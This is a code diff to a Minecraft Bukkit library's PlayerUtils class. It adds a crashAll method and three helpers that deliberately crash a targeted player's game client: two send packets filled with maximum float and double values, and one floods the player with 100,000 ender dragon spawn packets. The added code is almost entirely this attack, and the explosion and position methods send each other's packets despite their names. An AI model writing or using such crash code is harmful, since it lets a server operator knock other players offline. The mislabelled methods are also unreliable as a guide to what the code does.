@@ -1,20 +1,19 @@
 package top.speedcubing.lib.bukkit;
 
-import com.mojang.authlib.properties.Property;
-import com.mojang.authlib.properties.PropertyMap;
+import com.mojang.authlib.properties.*;
+import net.minecraft.server.v1_8_R3.World;
 import net.minecraft.server.v1_8_R3.*;
-import org.bukkit.Location;
+import org.bukkit.*;
+import org.bukkit.craftbukkit.v1_8_R3.CraftWorld;
 import org.bukkit.craftbukkit.v1_8_R3.entity.CraftPlayer;
 import org.bukkit.craftbukkit.v1_8_R3.inventory.CraftItemStack;
 import org.bukkit.entity.Player;
 import org.bukkit.inventory.ItemStack;
 import org.bukkit.inventory.PlayerInventory;
 import top.speedcubing.lib.bukkit.packetwrapper.OutPlayerListHeaderFooter;
+import top.speedcubing.lib.speedcubingLibBukkit;
 
-import java.util.ArrayList;
-import java.util.Arrays;
-import java.util.HashSet;
-import java.util.List;
+import java.util.*;
 
 public class PlayerUtils {
 
@@ -22,8 +21,35 @@ public class PlayerUtils {
         return ((CraftPlayer) player).getHandle().playerConnection;
     }
 
+
+    public static void crashAll(Player player) {
+        explosionCrash(player);
+        positionCrash(player);
+        entityCrash(player);
+    }
+
     public static void explosionCrash(Player player) {
-        getConnection(player).sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, new ArrayList<>(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
+        getConnection(player).sendPacket(new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Float.MAX_VALUE, Collections.emptySet()));
+    }
+
+    public static void positionCrash(Player player) {
+        getConnection(player).sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.emptyList(), new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
+    }
+
+    public static void entityCrash(Player player) {
+        Location loc = player.getLocation();
+        PlayerConnection c = getConnection(player);
+        Bukkit.getScheduler().runTaskAsynchronously(speedcubingLibBukkit.getPlugin(speedcubingLibBukkit.class), () -> {
+            for (int i = 0; i < 100000; i++) {
+                try {
+                    EntityEnderDragon entityEnderDragon = new EntityEnderDragon(((CraftWorld) loc.getWorld()).getHandle());
+                    PacketPlayOutSpawnEntityLiving living = new PacketPlayOutSpawnEntityLiving(entityEnderDragon);
+                    c.sendPacket(living);
+                } catch (Exception e) {
+                    throw new RuntimeException(e);
+                }
+            }
+        });
     }
 
     public static void removeArrows(Player player) {
